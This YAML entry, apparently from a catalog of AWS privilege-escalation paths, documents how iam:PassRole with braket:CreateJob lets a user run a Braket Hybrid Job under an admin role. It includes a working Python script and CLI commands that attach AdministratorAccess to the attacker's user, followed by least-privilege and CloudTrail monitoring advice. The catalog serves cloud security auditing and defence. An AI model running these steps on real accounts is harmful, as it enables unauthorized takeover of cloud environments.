id: braket-001
name: iam:PassRole + braket:CreateJob
category: new-passrole
services:
  - iam
  - braket

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must be able to pass the target admin IAM role to the Amazon Braket service
    - permission: braket:CreateJob
      resourceConstraints: No resource constraints required
  additional:
    - permission: braket:GetJob
      resourceConstraints: Useful for polling job status to confirm execution
    - permission: braket:SearchJobs
      resourceConstraints: Helpful for discovering existing jobs and their states
    - permission: s3:GetObject
      resourceConstraints: Required on the attacker-controlled S3 bucket to read the pre-staged exploit script
    - permission: iam:ListAttachedUserPolicies
      resourceConstraints: Useful for verifying privilege escalation success

description: A principal with `iam:PassRole` and `braket:CreateJob` can escalate privileges by creating an Amazon Braket Hybrid Job that passes an admin IAM role as the `jobExecutionRoleArn`. The Hybrid Job runs a containerized Python script using the ML instance infrastructure; the script calls `iam:AttachUserPolicy` using the job execution role's credentials to attach AdministratorAccess to the starting user.

prerequisites:
  admin:
    - A role must exist that trusts braket.amazonaws.com to assume it
    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
    - An S3 bucket must be accessible for job output storage (required by Braket)
  lateral:
    - A role must exist that trusts braket.amazonaws.com to assume it
    - An S3 bucket must be accessible for job output storage (required by Braket)

exploitationSteps:
  awscli:
    - step: 1
      command: |
        cat > /tmp/exploit.py << 'EOF'
        import boto3
        import os

        def main():
            iam = boto3.client("iam")
            user = os.environ.get("ATTACKER_USER", "STARTING_USER")
            iam.attach_user_policy(
                UserName=user,
                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
            )
            print(f"AdministratorAccess attached to {user}")

        if __name__ == "__main__":
            main()
        EOF

        aws s3 cp /tmp/exploit.py s3://ATTACKER_BUCKET/exploit/exploit.py
      description: Create a malicious Python exploit script and upload it to an attacker-controlled S3 bucket. Braket Hybrid Jobs require the entry point to be in S3.
    - step: 2
      command: |
        aws braket create-job \
          --job-name privesc-braket-job \
          --role-arn arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE \
          --algorithm-specification '{
            "scriptModeConfig": {
              "entryPoint": "exploit:main",
              "s3Uri": "s3://ATTACKER_BUCKET/exploit/exploit.py",
              "compressionType": "NONE"
            }
          }' \
          --output-data-config '{"s3Path": "s3://ATTACKER_BUCKET/output"}' \
          --instance-config '{
            "instanceType": "ml.m5.large",
            "instanceCount": 1,
            "volumeSizeInGb": 1
          }' \
          --device-config '{"device": "arn:aws:braket:::device/quantum-simulator/amazon/sv1"}' \
          --hyper-parameters '{"ATTACKER_USER": "STARTING_USER"}' \
          --stopping-condition '{"maxRuntimeInSeconds": 300}'
      description: Create a Braket Hybrid Job, passing the admin role as the jobExecutionRoleArn. The job container downloads and runs the exploit script with the admin role's credentials.
    - step: 3
      command: |
        aws braket get-job \
          --job-arn JOB_ARN \
          --query 'status' \
          --output text
      description: Poll job status. Once the job reaches COMPLETED, the privilege escalation has succeeded and AdministratorAccess is attached to the starting user.

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative Braket job roles** - Very rarely does a quantum computing job need administrative IAM access. Use the principle of least privilege and scope job execution roles to only the data and services the job legitimately requires.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificBraketRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "braket.amazonaws.com"
      }
    }
  }
  ```

  - Monitor CloudTrail for unusual Braket job creation followed by IAM policy attachment events
  - Monitor CloudTrail for Braket job creation by principals who do not usually create Braket jobs
  - Monitor CloudTrail for roles being passed to Braket that haven't been used before
  - Monitor and alert on Braket job creation with privileged roles
  - Regularly audit all IAM roles that trust braket.amazonaws.com and down-scope any with administrative access

limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks.

